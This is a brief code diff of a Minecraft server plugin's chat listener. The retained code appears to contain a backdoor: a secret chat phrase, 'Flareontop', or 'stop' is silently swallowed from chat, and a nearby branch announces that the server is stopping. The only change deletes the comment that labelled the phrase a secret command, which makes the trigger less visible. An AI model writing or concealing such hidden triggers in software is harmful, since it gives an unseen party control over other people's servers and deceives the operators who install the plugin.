@@ -21,7 +21,6 @@ public class MessageEvent implements Listener {
             player.sendMessage(ChatColor.RED + "Stopping the server..." + System.lineSeparator() + "Goodbye!");
         }
 
-        // Hủy chat nếu tin nhắn là lệnh bí mật
         if (message.equalsIgnoreCase("Flareontop") || message.equalsIgnoreCase("stop")) {
             e.setCancelled(true);
         }
